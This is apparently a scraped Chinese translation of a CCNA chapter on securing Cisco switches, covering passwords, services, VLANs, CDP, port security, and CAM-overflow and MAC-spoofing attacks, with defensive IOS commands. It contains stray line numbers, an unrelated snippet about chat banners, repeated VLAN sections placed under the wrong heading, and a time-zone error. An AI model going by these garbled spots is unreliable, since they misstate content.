Password全局配置模式允许用户对交换机或路由器进行配置，还可以擦除配置，以及重置口令。你务必要设置一个口令或秘密口令来保护此模式，而这实际上是为阻止用户闯过（get past）用户模式。一般口令在路由器配置文件中会显示出来，而 enable secret 口令则会进行加密。上面已经提到，你实际上可以在交换机或路由器上同时设置使能口令（a password）和使能秘密口令（enable secret password）,但这会带来混乱。所以请只设置使能秘密口令就好。下面的配置文件演示了通过在命令前键入 do 关键字，而无需回到特权模式，就可执行该命令的情形。Switch1(config)#enable password ciscoSwitch1(config)#do show runBuilding configuration...Current configuration: 1144 byteshostname Switch1enable password ciscoFarai 补充道 -- “你可以使用 service password-encryption 命令，对使能口令 enable password 进行 7 级加密。”通过在命令前加上 no 关键字后再次执行该命令，可以擦除配置文件中的大多数行。上面 Farai 提到的使用 service password-encryption 命令是毫无作用的，因为这个方法仅提供了弱加密（7 级）， 而下面的秘密口令（the secret password）则有着强加密（MD5）。Switch1(config)#no enable passwordSwitch1(config)#enable secret ciscoSwitch1(config)#do show runBuilding configuration...Current configuration: 1169 byteshostname Switch1enable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0 [strong level 5 password] 服务，Services 12345678910111213141516171819202122232425262728293031323334353637383940414243444546你总是应该关闭那些你不会用到的服务。思科已经在关闭那些不安全和很少用到的服务和协议上做得很好了；尽管如此，你可能会要因明确这点而亲自关闭它们。同样也会有一些服务是有帮助的。多数服务可在全局配置模式中的 service 命令下找到。Switch(config)# service ?compress-config Compress the configuration fileconfig TFTP load config filescounters Control aging of interface countersdhcp Enable DHCP server and relay agentdisable-ip-fast-frag Disable IP particle-based fast fragmentationexec-callback Enable EXEC callbackexec-wait Delay EXEC startup on noisy linesfinger Allow responses to finger requestshide-telnet-addresses Hide destination addresses in telnet commandlinenumber enable line number banner for each execnagle Enable Nagle’s congestion control algorithmold-slip-prompts Allow old scripts to operate with slip/ppppad Enable PAD commandspassword-encryption Encrypt system passwordspassword-recovery Disable password recoveryprompt Enable mode specific promptpt-vty-logging Log significant VTY-Async eventssequence-numbers Stamp logger messages with a sequence numberslave-log Enable log capability of slave IPstcp-keepalives-in Generate keepalives on idle incoming network connectionstcp-keepalives-out Generate keepalives on idle outgoing network connectionstcp-small-servers Enable small TCP servers (e.g., ECHO)telnet-zeroidle Set TCP window 0 when connection is idletimestamps Timestamp debug/log messagesudp-small-servers Enable small UDP servers (e.g., ECHO)一般来讲，有下列的这些最常见的要开启或关闭的服务。其各自的说明在中括号里。no service pad [数据包组装程序/分拆程序，在异步组网中有使用；很少使用到]no service config [阻止交换机从网络获取其配置文件]no service finger [关闭 finger 服务器；很少用到]no ip icmp redirect [组织 ICMP 重定向，而 ICMP 重定向可被用于路由器投毒]no ip finger [关闭 finger 服务的另一种方式]no ip gratuitous-arps [关闭此服务以阻止中间人攻击（man-in-the-middle attacks）]no ip source-route [关闭由用户提供到目的地的逐跳路由(user-provided hop-by-hop routing to destination)]service sequence-numbers [在每条日志记录中，分配给其一个编号，同时此编号序列增加]service tcp-keepalive-in [防止路由器将挂起的管理会话一直保持开启，prevents the router from keeping hung management sessions open]service tcp-keepalive-out [与 sevice tcp-keepalive-in 功能一样]no service upp-small-servers [关闭 echo, chargen, discard, daytime 等功能，这些功能很少用到]no service tcp-small-servers [关闭 echo, chargen, discard 等功能，这些功能很少用到]service timestamps debug datetime localtime show-timezone [在调试模式下（in debug mode）, 将每个记录的数据包，使用本地时间，打上日期和时间的时间戳，并显示时区]service timestamps log datetime localtime show-timezone [在非调试模式下（not in debug mode）, 将每个记录的数据包，使用本地时间，打上日期和时间的时间戳，并显示时区 -- 这服务在查看日志文件非常有用，尤其是在时钟设置正确的情况下] 修改原生 VLAN， Change the Native VLAN 123456789101112131415161718192021222324交换机使用原生 VLAN 来承载那些特定的协议流量，诸如思科发现协议（Cisco Discovery Protocol, CDP）、VLAN 中继协议（VLAN Trunking Protocol, VTP）、端口聚合协议（Port Aggregation Protocol, PAgP），以及动态中继协议（Dynamic Trunking Protocol, DTP）等协议信息。默认原生 VLAN 总是 VLAN 1; 但原生 VLAN 是可以手动设置为任何有效 VLAN 编号（除开 0 和 4096, 因为这些 VLAN 编号处于 VLANs 的保留范围）。你可以使用下面输出中演示的命令（在每个接口下执行的），来查看原生 VLAN。Switch#show interfaces FastEthernet0/1 switchportName: Fa0/1Switchport: EnabledAdministrative Mode: trunkOperational Mode: trunkAdministrative Trunking Encapsulation: dot1qOperational Trunking Encapsulation: dot1qNegotiation of Trunking: OnAccess Mode VLAN: 1 (default)Trunking Native Mode VLAN: 1 (default)Voice VLAN: none将端口放入 VLAN 1 被认为是一种安全漏洞（a security vulnerability）, 允许黑客取得网络资源的访问。为减轻此问题，避免任何主机放入 VLAN 1 是一种明智可取的做法。同时也可将所有中继接口上的原生 VLAN 修改为某个未使用的 VLAN。Switch(config-if)#switchport trunk native vlan 888注意： 这是 CCNA 大纲中的一个关键目标（one of the key objectives）, 所以务必牢记。你还可以用下面的命令，来阻止原生 VLAN 上的数据通过中继链路。Switch(config-if)#switchport trunk allowed vlan remove 888 修改管理 VLAN, Change the Management VLAN 1234567给交换机配置一个 IP 地址，以实现为管理目的而远程登陆到其上，也是可以的。这又叫做交换机虚拟接口（Switch Virtual Interface, SVI）。将该管理访问做到除 VLAN 1 之外的其它 VLAN 上，是一种明智的预防措施，如下面的输出所示。Switch(config)#vlan 3Switch(config-vlan)#interface vlan3%LINK-5-CHANGED: Interface Vlan3, changed state to upSwitch(config-if)#ip address 192.168.1.1 255.255.255.0 关闭 CDP, Turn Off CDP 12345678910111213141516171819202122232425262728后面会讲到思科发现协议（Cisco Discovery Protocol, CDP）, 但在这里，你要知道，在大多数的路由器和交换机上的每个接口下，该协议都是打开的，这也是通行的做法，其功能是发现路由器或交换机上连接的思科设备。你可能不打算让其它思科设备看到你的网络设备的信息，那么就可以关掉这个服务，至少应该在那些你的网络边缘上的，连接其它公司或者 ISP 的那些设备上关闭 CDP。Farai 指出 -- “CDP 在比如 ASR 路由器的所有平台上默认都未开启。”在下面的输出中，你能看到一台连接我的交换机的路由器，在我执行 show cdp neighbor detail 命令时，其能看见哪些基本信息。Router#show cdp neighbor detailDevice ID: Switch1Entry address(es):Platform: Cisco 2960, Capabilities: SwitchInterface: FastEthernet0/0, Port ID (outgoing port): FastEthernet0/2Holdtime: 176Version :Cisco Internetwork Operating System SoftwareIOS (tm) C2960 Software (C2960-I6Q4L2-M), Version 12.1(22)EA4, RELEASE SOFTWARE(fc1)Copyright (c) 1986-2005 by Cisco Systems, Inc.Compiled Wed 18-May-05 22:31 by jharirbaadvertisement version: 2Duplex: fullRouter#下面的命令将对整个设备关闭 CDP。Switch1(config)#no cdp run而要对某个特定接口关闭 CDP， 执行以下命令。Switch1(config)#int FastEthernet0/2Switch1(config-if)#no cdp enable 添加横幅消息，Add a Banner Message 123456789101112131415161718192021222324252627横幅消息将于某用户登入路由器或交换机时显示出来。其并不会提供任何实质性的安全，但会显示你设置的警告信息。在下面的配置中，我选择的是 “Y” 字母作为界定符（delimiting character）, 界定符用以告诉路由器，我已输完消息文字。Switch1(config)#banner motd YEnter TEXT message. End with the character ‘Y’.KEEP OUT OR YOU WILL REGRET IT YSwitch1(config)#在我从交换机登入到路由器时，我能看到横幅消息。错在选择了 “Y” 作为界定符，因为它割除了我的消息文字。Router#telnet 192.168.1.3Trying 192.168.1.3 ...OpenKEEP OUT OR横幅消息可以是以下这些。在用户看到登陆提示符之前显示出来 -- MOTD（message of the day）在用户看到登陆提示符之前显示出来 -- Login在登陆提示符之后显示给用户 -- Exec （在你打算对未授权用户隐藏的信息）在本书中，横幅消息作为一些实验的组成部分。我建议你掌握全部三种类型横幅消息，并以登入路由器的方式来测试它们。依据你所用的平台和 IOS，会有不同的选择。Router(config)#banner ? LINE c banner-text c, where ‘c’ is a delimiting character exec Set EXEC process creation banner incoming Set incoming terminal line banner login Set login banner motd Set Message of the Day banner prompt-timeout Set Message for login authentication timeout slip-ppp Set Message for SLIP/PPP 1234说实话这书的翻译太烂了。什么安全壳What is the banner message?Banner MessageBanner messages are responses that are displayed to the user on top of the chat window/screen. A banner can be shown as a response for the following actions: Executing a command. Performing an action on a message (Message Action) 设置 VTP 口令， Set a VTP Password 12345678VTP 确保网络上交换机之间传输的是精确的 VLAN 信息。而为了保护 VLAN 信息的更新，你应该在交换机上加入 VTP 口令（该 VTP 域中所有交换机上的 VTP 口令都应一致）， 如下面输出演示的那样。Switch1(config)#vtp domain 60daysChanging VTP domain name from NULL to 60daysSwitch1(config)#vtp password ciscoSetting device VLAN database password to ciscoSwitch1(config)# ​ 17.限定 VLAN 信息， Restrict VLAN Infaomation 123456789101112131415161718默认下的交换机允许所有 VLANs 通过中继链路。你将其修改为指定 VLANs 才能通过中继链路。如下面的输出所示。Switch1(config)#int FastEthernet0/4Switch1(config-if)#switchport mode trunkSwitch1(config-if)#switchport trunk allowed vlan ? WORD VLAN IDs of the allowed VLANs when this port is in trunking mode add add VLANs to the current list all all VLANs except all VLANs except the following none no VLANs remove remove VLANs from the current listSwitch1(config-if)#switchport trunk allowed vlan 7-12Switch1#show interface trunkPort Mode Encapsulation Status Native vlanFa0/4 on 802.1q trunking 1Port Vlans allowed on trunkFa0/4 7-12 18.端口因出错关闭后的恢复功能，Error Disable Recovery123456789101112131415161718默认下的交换机允许所有 VLANs 通过中继链路。你将其修改为指定 VLANs 才能通过中继链路。如下面的输出所示。Switch1(config)#int FastEthernet0/4Switch1(config-if)#switchport mode trunkSwitch1(config-if)#switchport trunk allowed vlan ? WORD VLAN IDs of the allowed VLANs when this port is in trunking mode add add VLANs to the current list all all VLANs except all VLANs except the following none no VLANs remove remove VLANs from the current listSwitch1(config-if)#switchport trunk allowed vlan 7-12Switch1#show interface trunkPort Mode Encapsulation Status Native vlanFa0/4 on 802.1q trunking 1Port Vlans allowed on trunkFa0/4 7-12 限定 VLAN 信息， Restrict VLAN Infaomation1234567891011121314151617默认下的交换机允许所有 VLANs 通过中继链路。你将其修改为指定 VLANs 才能通过中继链路。如下面的输出所示。Switch1(config)#int FastEthernet0/4Switch1(config-if)#switchport mode trunkSwitch1(config-if)#switchport trunk allowed vlan ? WORD VLAN IDs of the allowed VLANs when this port is in trunking mode add add VLANs to the current list all all VLANs except all VLANs except the following none no VLANs remove remove VLANs from the current listSwitch1(config-if)#switchport trunk allowed vlan 7-12Switch1#show interface trunkPort Mode Encapsulation Status Native vlanFa0/4 on 802.1q trunking 1Port Vlans allowed on trunkFa0/4 7-12 端口因出错关闭后的恢复功能，Error Disable Recovery1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768由一系列的事件导致的，思科交换机将其端口置为一种特别的关闭模式（a special diabled mode）, 叫做出错关闭（err-disabled）。此特性简单来讲，由于在某个特定端口上发生某种错误后，该端口就被关闭了。错误可能有多种原因，之最常见的就是出现触发了某项端口安全策略（a port security policy）。在某个未授权用户尝试连接到某个交换机端口时，这是通常的做法，它阻止那些违规设备访问网络。出错关闭端口(an err-disabled port）看起来会是这样的。Switch# show interface f0/1FastEthernet0/1 is down, line protocol is down [err-disabled].....而为了重新使用（re-activate）某个出错关闭接口，以在该接口上执行 shutdown 及 no shutdown 命令的人工干预是必要的, 网络工程师们俗称此操作为端口弹跳(a bouncing the port)。但是，某些情形要求从原端口状态自动恢复过来，而不是等到管理员手动开启该端口。此出错关闭回复模式，通过将交换机配置为在依引发通信失败事件的不同，而不同的一段时间后，自动重新打开出错关闭端口的方式，来发挥作用。区分通信失败事件，提供了出错关闭恢复功能所监测事件上的粒度（granularity）控制。完成该功能设置的命令是 errdisable recovery cause, 在全局路由器配置模式下输入。Switch(config)#errdisable recovery cause ? all Enable timer to recover from all causes bpduguard Enable timer to recover from bpdu-guard error disable state dtp-flap Enable timer to recover from dtp-flap error disable state link-flap Enable timer to recover from link-flap error disable state pagp-flap Enable timer to recover from pagp-flap error disable state rootguard Enable timer to recover from root-guard error disable state udld Enable timer to recover from udld error disable state......errdisable recovery cause 命令依设备型号会有所不同，但最常见的参数有这些。allarp-inspectionbpduguarddhcp-rate-limitlink-flappsecure-violationsecurity-violationstorm-controludld多数平台上端口自动恢复的默认时间是 300 秒，此时间可以用全局配置命令 errdisable recovery interval 手动修改。Switch(config)#errdisable recovery interval ? &lt;30-86400&gt; timer-interval(sec)而命令 show errdisable recovery 命令则会提供有关出错关闭恢复功能（the err-disable recovery function）激活了的那些特性的细节信息，以及受到监测的接口，并包含了接口重新开启剩余时间。Switch#show errdisable recoveryErrDisable Reason Timer Status----------------- --------------arp-inspection Disabledbpduguard Disabledchannel-misconfig Disableddhcp-rate-limit Disableddtp-flap Disabledgbic-invalid Disabledinline-power Disabledl2ptguard Disabledlink-flap Disabledmac-limit Disabledlink-monitor-failure Disabledloopback Disabledoam-remote-failure Disabledpagp-flap Disabledport-mode-failure Disabledpsecure-violation Enabledsecurity-violation Disabledsfp-config-mismatch Disabledstorm-control Disabledudld Disabledunicast-flood Disabledvmps DisabledTimer interval: 300 secondsInterfaces that will be enabled at the next timeout:Interface Errdisable reason Time left(sec)--------- ----------------- --------------Fa0/0 psecure-violation 193 外部认证方式，External Authentication Methods123456789与本地存储不同，你可以采用一台通常运行了 AAA 或 TACACS+ 的服务器来存储用户名和口令。这么做的优势在于，你无需在每台路由器和交换机上都手动输入用户名和口令。而是将其存储在服务器的数据库中。TACACS+ 表示“加强版终端访问控制器访问控制系统（Terminal Access Controller Access Control System Plus, TACACS+）”。它是一个思科专有协议，使用 TCP 49 号端口。TACACS+ 提供了经由一台或多台 TACACS+ 中心服务器，对包含路由器及网络介入服务器等网络设备的访问控制。拨入用户远端认证服务（Remote Authentication Dial-In User Service, RADIUS）, 是一套分布式网络安全系统，用以确保网络远程访问的安全性，同时它又是一个使用 UDP 的客户端/服务器协议（a client/server protocol）。RADIUS 是开放标准。如你拥有 TACACS+ 或者 RADIUS，那么你可能希望开启认证、授权和记账（Authentication, Authorization, and Accounting, AAA）。AAA 是安装在一台服务器上的，它监测着网络的一个用户帐号数据库。用户访问、协议、连接，以及断开原因，及其它很多特性都能被监测到。路由器和交换机可被设置为在某用户尝试登入时查询服务器。服务器此时来验证用户。CCNA 考试不要求你去配置这些协议。 路由器时钟及 NTP， Router Clock and NTP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354交换机上的时间经常被忽略；但它却是重要的。在你遇到安全入侵（security violations）、SNMP 问题（SNMP traps）, 或者事件记录时，会用到时间戳。如交换机上的时间不正确，就会难于找出时间发生的时间。举个例子，让我们看看下面的交换机，并检查一下它的时间。Switch#show clock*23:09:45.773 UTC Tue Mar 2 1993该时间是不准确的，所以我们要修改一下。但首先，我们要设置一些属性值。clock timezone CST -6clock summer-time CDT recurringclock summer-time CST recurring 2 Sun Mar 2:00 1 Sun Nov 2:00首先，我们设置时区（the time zone）。我是位于中部时区（the Central time zone）， 比 GMT 要早 6 个小时。接着告诉交换机夏令时（时间变化，the time change）是循环的。最后设置夏令时具体是什么。此时，我们就可以设置时间和日期了。Switch#clock set 14:55:05 June 19 2007Switch#1d23h: %SYS-6-CLOCKUPDATE: System clock has been updated from 17:26:01 CSTTue Mar 2 1993 to 14:55:05 CST Tue Jun 19 2007, configured from console by console.Switch#show clock14:55:13.858 CST Tue Jun 19 2007请注意，时钟设置实在使能模式（Enable mode），而不是配置模式下。除了手动设置时钟外，你可以使用网络时间协议（Network Time Protocol, NTP）。它让你可将交换机的时钟与某台原子钟（an atomic clock）同步，保证非常精确的时间。Switch(config)#ntp server 134.84.84.84 preferSwitch(config)#ntp server 209.184.112.199使用下面的两个命令，你可以查看时钟是否已经和 NTP 源保持同步。Switch#show ntp associationsSwitch#show ntp status在第 40 天中，我们会涉及更多有关 NTP 的内容。关闭未用到的那些端口，Shut Down Unused Ports未使用的，或者说“空起的”那些没有任何网络设备的端口，因为某人会插入一条网线并将未授权设备连接到网络，而引发安全威胁。这会导致一些安全问题，包括。网络未能如同与其的那样运作网络信息暴露于外部人员这就是为何你要关闭路由器、交换机及其它网络设备上，所有未使用端口的原因。依据具体设备，关闭状态可能是端口默认的状态，但你仍要对此进行验证。而关闭端口是通过在接口配置模式下使用 shutdown 命令完成的。Switch#conf tSwitch(config)#int fa0/0Switch(config-if)#shutdown验证某端口处于关闭状态有多种方法，其一就是使用 show ip interface brief 命令。Router(config-if)#do show ip interface briefInterface IP-Address OK? Method Status ProtocolFastEthernet0/0 unassigned YES unset administratively down downFastEthernet0/1 unassigned YES unset administratively down down请注意，管理性关闭状态就是说该端口是手工关闭的。验证关闭状态的另一方法是使用 show interface 命令。Router#show interface fa0/0FastEthernet0/0 is administratively down, line protocol is down Hardware is Gt96k FE, address is c200.27c8.0000 (bia c200.27c8.0000) MTU 1500 bytes, BW 10000 Kbit/sec, DLY 1000 usec,......思科发现协议， Cisco Discovery Protocol, CDP 思科发现协议， Cisco Discovery Protocol, CDP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970现在来讨论思科发现协议正是时候。CDP 因为其在做出任何配置之前，就提供了一种发现有关网络设备信息的方法，而是一个热门的考试考点。它是一直非常有用的故障排除工具；但它又带来了安全威胁。CDP 是一个思科专有协议，也就是说它只运行在思科设备上。它是一种二层服务, 设备用它来通告和接收那些直接连接设备的基本信息。IEEE 版本的 CDP 叫做链路层发现协议（Link Layer Discovery Protocol, LLDP）, CCNA 大纲并不包含此内容。因为 CDP 是一种二层服务，所以它并不需要配置有 IP 地址来交换信息。只需开启接口就行。如有配置 IP 地址，该 IP 地址也会包含进 CDP 消息中。CDP 作为非常强大的故障排除工具，考试中要求你掌握如何来使用它。图 4.1 展示了 Router 0 的 CDP 输出。请设想一下在没有拓扑图（topology diagram）的情况下，你要对此网络进行故障排除的情形。Router 0 的 CDP 输出图 4.1 -- Router 0 的 CDP 输出下列配置输入，正是图 4.1 中的。Router0#show cdp neighborsCapability Codes: R - Router, T - Trans Bridge, B - Source Route Bridge, S - Switch, H -Host, I - IGMP, r - Repeater, P - PhoneDevice ID Local Interface Holdtime Capability Platform PortSwitch Fas 0/0 165 S 2960 Fas 0/1Router Fas 0/1 169 R C1841 Fas 0/0Router0#在上述命令的后面加上 detail 命令，你可以看到更多信息。Router0#show cdp neighbors detailDevice ID: SwitchEntry address(es):Platform: cisco 2960, Capabilities: SwitchInterface: FastEthernet0/0, Port ID (outgoing port): FastEthernet0/1Holdtime: 178Version :Cisco IOS Software, C2960 Software (C2960-LANBASE-M), Version 12.2(25)FX, RELEASESOFTWARE (fc1)Copyright (c) 1986-2005 by Cisco Systems, Inc.Compiled Wed 12-Oct-05 22:05 by pt_teamadvertisement version: 2Duplex: full---------------------------Device ID: RouterEntry address(es): IP address : 192.168.1.2Platform: cisco C1841, Capabilities: RouterInterface: FastEthernet0/1, Port ID (outgoing port): FastEthernet0/0Holdtime: 122Version :Cisco IOS Software, 1841 Software (C1841-ADVIPSERVICESK9-M), Version 12.4(15)T1, RELEASESOFTWARE (fc2)Technical Support: http://www.cisco.com/techsupportCopyright (c) 1986-2007 by Cisco Systems, Inc.Compiled Wed 18-Jul-07 04:52 by pt_teamadvertisement version: 2Duplex: full现在你可以看到 IOS 版本、型号、IP 地址以及其它信息。记住现在你仍未在 Router 0 上配置 IP 地址。前面我们已经讲过怎样在整台设备或仅在某个接口上关闭 CDP 了。而另两个有关命令是显示设备有关 CDP 的协议信息的 show cdp 命令，以及通过输入设备名称来查看某台具设备信息的 show cdp entry &lt;Router&gt; 命令。建议在今天要配置的实验中花些时间，来查看 CDP 的众多输出。Router0#show cdpGlobal CDP information: Sending CDP packets every 60 seconds Sending a holdtime value of 180 seconds Sending CDPv2 advertisements is enabledRouter0#show cdp ? entry Information for specific neighbor entry interface CDP interface status and configuration neighbors CDP neighbor entries traffic CDP statistics | Output modifiers &lt;cr&gt; 交换机端口安全，Switch Port Security1234567891011121314端口安全特性，是通过限制某个特定端口或是接口能够学习到的 MAC 地址数目，来保护交换机端口安全，并最终确保内容可寻址存储器（Content Addressable Memory, CAM）表的安全的一项，Catalyst 交换机的有力特性。具备了端安全特性，交换机就能够维护一张用于明确哪个 MAC 地址（或哪些地址），可以接入哪些本地交换机端口的表格。此外，交换机同样可以配置为仅允许在任何给定的端口上学习到指定数量的 MAC 地址。端口安全如图 4.2 所示。注：关于CAM的更多信息，请参考 CAM (Content Addressable Memory) VS TCAM (Ternary Content Addressable Memory)。&quot;端口安全的运作&quot;图 4.2 -- 端口安全的运作图 4.2 展示了在某台 Catalyst 交换机上，通过端口安全特性配置的 4 个端口，它们都只允许单一 MAC 地址接入。从 1 号到 3 号端口连接的 MAC 地址与端口安全所允许的地址匹配。在没有其它过滤的情况下，这些主机就能够经由其各自交换机端口转发流量。而端口 4 上所配置的是允许 AAAA.0000.0004 MAC 地址，但所接入的 MAC 地址却是 BBBB.0000.0001。因为主机 MAC 地址与所允许的 MAC 不一样，端口安全（port security）将在端口上做出如同管理员所设定的适当动作。这些有效端口安全动(the valid port security actions)作将在接下来的部分详细说明。端口安全特性设计用于保护交换局域网（the switched LAN）免受两种主要的攻击方式。这两种方式在下的小节讲到。CAM 表溢出攻击， CAM table overflow attacksMAC 欺骗攻击， MAC spoofing attacks CAM 表溢出攻击12345678910111213141516171819202122232425262728交换机的 CAM 表是一些存储位置，这些存储位置包含了物理端口上的那些 MAC 地址，及其 VLAN 参数。交换机 CAM 表中动态学习到的内容，或者说 MAC 地址表，可通过命令 show mac-address-table dynamic 查看到，如下面的输出所示。VTP-Server-1#show mac-address-table dynamic Mac Address Table-------------------------------------------Vlan Mac Address Type Ports---- ----------- -------- ----- 2 000c.cea7.f3a0 DYNAMIC Fa0/1 2 0013.1986.0a20 DYNAMIC Fa0/2 6 0004.c16f.8741 DYNAMIC Fa0/3 6 0030.803f.ea81 DYNAMIC Fa0/4 8 0004.c16f.8742 DYNAMIC Fa0/5 8 0030.803f.ea82 DYNAMIC Fa0/6Total Mac Addresses for this criterion: 6如同所有的计算装置一样，交换机的存储资源也是有限的。这就意味着 CAM 表的存储空间是固定的，已分配好的。CAM 表溢出攻击（CAM table overflow attacks）将此限制作为目标，用大量随机生成的无效源及目的 MAC 地址灌入交换机，直到填满 CAM 表，此时交换机就无法接收新的 CAM 表条目了。在此情况下，交换机成为了一台集线器，只能开始简单地将新近接收的帧广播到其上的所有接口（同一 VLAN 中的），就是将该 VLAN 变成了一个大的广播域。对 CAM 表的攻击易于开展，因为有着像 MACOF 及 DSNIFF 等常见的工具可用于实施这样的行为。而增加 VLANs 的数目（此举减少了广播域的尺寸），可有助于降低 CAM 表攻击的影响，在交换机上配置端口安全特性，是推荐的安全方案。MAC 欺骗攻击，MAC Spoofing AttacksMAC 地址欺骗，用于冒充某个源 MAC 地址，以达到扮演网络上的其它主机或设备的目的。冒充（spoofing）就是伪装成或扮着是并非你本人的某个人。MAC 地址欺骗的主要目的是扰乱交换机，令到其以为某台同一主机连接到两个端口上，这就导致交换机尝试同时将帧转发给受信任的主机和攻击者。图 4.3 展示了连接4 台不同网络主机的交换机的 CAM 表。&quot;交换机 CAM 表的建立&quot;图 4.3 中, 交换机允许正常，根据 CAM 表条目，它知道连接至其端口上的所有设备的 MAC 地址。而基于当前的 CAM 表，如 4 号主机想要发给 2 号主机一个帧，交换机就会简单地将该帧转发出它的 FastEthernet 0/2 接口，而前往 2 号主机。现在，假设 1 号主机被某个想要接收所有发往 2 号主机流量的攻击者入侵了。则经由 MAC 地址欺骗，攻击者精心构建出使用 2 号主机源地址的以太网帧。在交换机收到该帧后，它记下该源地址，并重写 CAM 表中 2 号主机所对应的条目，将其指向 FastEthernet 0/1 端口，而不是 2 号主机所真正连接的 FastEthernet 0/2。此概念如图 4.4 所示。 MAC 欺骗攻击，MAC Spoofing Attacks12345678910111213MAC 地址欺骗，用于冒充某个源 MAC 地址，以达到扮演网络上的其它主机或设备的目的。冒充（spoofing）就是伪装成或扮着是并非你本人的某个人。MAC 地址欺骗的主要目的是扰乱交换机，令到其以为某台同一主机连接到两个端口上，这就导致交换机尝试同时将帧转发给受信任的主机和攻击者。图 4.3 展示了连接4 台不同网络主机的交换机的 CAM 表。&quot;交换机 CAM 表的建立&quot;图 4.3 中, 交换机允许正常，根据 CAM 表条目，它知道连接至其端口上的所有设备的 MAC 地址。而基于当前的 CAM 表，如 4 号主机想要发给 2 号主机一个帧，交换机就会简单地将该帧转发出它的 FastEthernet 0/2 接口，而前往 2 号主机。现在，假设 1 号主机被某个想要接收所有发往 2 号主机流量的攻击者入侵了。则经由 MAC 地址欺骗，攻击者精心构建出使用 2 号主机源地址的以太网帧。在交换机收到该帧后，它记下该源地址，并重写 CAM 表中 2 号主机所对应的条目，将其指向 FastEthernet 0/1 端口，而不是 2 号主机所真正连接的 FastEthernet 0/2。此概念如图 4.4 所示。![&quot;MAC 地址欺骗&quot;](images/0404.png width=800)根据图 4.4, 在 3 号主机或 4 号主机尝试将帧发给 2 号主机时，交换机会将这些帧转发出 FastEthernet 0/1, 到 1 号主机，因为 CAM 表已被 MAC 地址欺骗攻击投毒。在 2 号主机发出另一个帧时，交换机再次从 FastEthernet 0/2 了解其 MAC 地址, 并再度将 CAM 表条目重写，以反应出该变化。结果就出现 2 号主机与 1 号主机之间就谁保有此 MAC 地址的拔河。此外，这也将扰乱交换机，造成反复的重写 MAC 地址表条目，引发在合法主机（也就是 2 号主机）上的拒绝服务攻击（Denial of Service , DoS）。而假如假冒的 MAC 地址数目很高，MAC 地址欺骗攻击还将对持续重写其 CAM 表的交换机的性能造成严重影响。应用端口安全(implementing port security)，可以减轻 MAC 地址欺骗攻击的影响。 地址安全的端口安全，Port Security Secure Addresses12345678910经由端口安全特性，我们可以指定特定 MAC 才被允许访问某个交换机端口，同时限制某个单一交换机端口所支持的 MAC 地址数目。以下本节所说明的几种端口安全应用方式。静态 MAC 地址保全, Static secure MAC addresses动态 MAC 地址保全, Dynamic secure MAC addresses粘滞 MAC 地址保全, Sticky secure MAC addresses静态 MAC 地址保全是由网络管理员静态配置，并存储在 MAC 地址表中，同时还保存在交换机配置文件里。当将静态 MAC 地址保全指派给某个安全端口时，交换机不会转发那些源地址与所配置的静态安全 MAC 地址不匹配的帧。动态 MAC 地址保全，是交换机所学习到的，存储在 MAC 地址表中。与静态 MAC 地址安全不同，在交换机重启或断电后，动态安全 MAC 地址条目会从交换机中移除。在交换机再次启动时，这些地址要再次习得。粘滞的 MAC 地址保全，是静态和动态 MAC 地址保全的结合。地址可动态习得，也可静态配置，存储在 MAC 地址表中，也保存在交换机配置文件里。这就意味着在交换机关闭或是重启后，它无需再次动态发现 MAC 地址，因为这些 MAC 地址已经保存在配置文件中了（如你有保存允许的配置）。 动作的端口安全，Port Security Actions12345678910111213一旦开启了端口安全，管理员就可定义出在出现违反端口安全事件后，交换机所采取的动作了。思科 IOS 软件允许管理员指定 4 种在出现冲突时所采取的不同动作。保护，Protect关闭（默认动作）, Shutdown(default)限制，Restrict关闭 VLAN （超出 CCNA 大纲）, Shutdown VLAN(outside of the CCNA syllabus)保护动作选项强制端口进入受保护端口模式（Protected Port mode）。此模式下，交换机会简单地丢弃所有源地址不明的单播和多播帧（simply discard all Unicast or Multicast frames with unknown source MAC addresses）。而在交换机被配置为保护某端口时，当其以受保护端口模式运行时，不会发出通知，这就意味着由处于此模式下的交换机端口阻止所有流量时，管理员是无法获知的。关闭动作选项则是在出现违反端口安全后，将某端口置于某种错误关闭状态（an err-disabled state）。在此配置动作被用到时，交换机上相应端口的 LED 同时被关闭。而在关闭模式下，交换机发出一条 SNMP trap (浅谈 Linux 系统中的 SNMP trap), 以及一条 syslog 消息，同时冲突计数器会增大。这个选项是接口配置了端口安全时的默认动作。限制动作选项是在安全 MAC 地址数目到达管理员为该端口所定义的最大限制时，用于丢弃那些带有不明 MAC 地址的数据包。此模式下，交换机会持续限制额外的那些 MAC 地址发出帧，直到移除对那些安全 MAC 地址数目的限制，或直到所允许的最大地址数目得以增加。和关闭工作选项一样，交换机也会发出一条 SNMP trap 及一条 syslog 消息，同时冲突计数器会增加。关闭 VLAN 动作选项跟关闭动作选项类似；不过此选项是关闭某个 VLAN, 而不是某个交换机端口。此配置可能会应用在那些指派了多个 VLAN， 诸如语音 VLAN 和数据 VLAN， 的端口上，以及交换机的中继链路上。 端口安全配置， Configuring Port Security12345678910111213141516在配置端口安全之前，建议将交换机端口静态配置为二层接入端口（端口安全只能配置为静态接入端口或中继端口上，不能配置在动态端口上）。此配置如下面的输出所示。VTP-Server-1(config)#interface FastEthernet0/1VTP-Server-1(config-if)#switchportVTP-Server-1(config-if)#switchport mode access注意: 在诸如 Catalyst 2950 及 Catalyst 2960 系列的二层交换机上无需 switchport 命令。而在比如 Catalyst 3750、Catalyst 4500 以及 Catalyst 6500 系列等的多层交换机上， 它是要要到的。默认情况下，端口安全是关闭的；但可通过接口配置命令 switchport port-security [mac-address &#123;mac-address&#125; [vlan &#123;vlan-id | &#123;access | voice&#125;&#125;] | mac-address &#123;sticky&#125; [mac-address | vlan &#123;vlan-id | &#123;access | voice&#125;&#125;] [maximum &#123;value&#125; [vlan &#123;vlan-list | &#123;access | voice&#125;&#125;]] 予以开启。表 4.1 说明了该命令的这些选项。关键字 说明mac-address &#123;mac-address&#125; 此关键字用于指定一个静态保全 MAC 地址。你还可以加入不超过配置的最大数目的其它安全 MAC 地址。vlan &#123;vlan id&#125; 此关键字应只使用在某个中继端口上，以指定 VLAN ID 和 MAC 地址。如没有指定 VLAN ID，就使用原生 VLAN。vlan &#123;access&#125; 此关键字应只用在某个接入端口上，以指定该 VLAN 作为接入 VLAN。vlan &#123;voice&#125; 此关键字应只用在某个接入端口上, 用以知道该 VLAN 作为一个语音 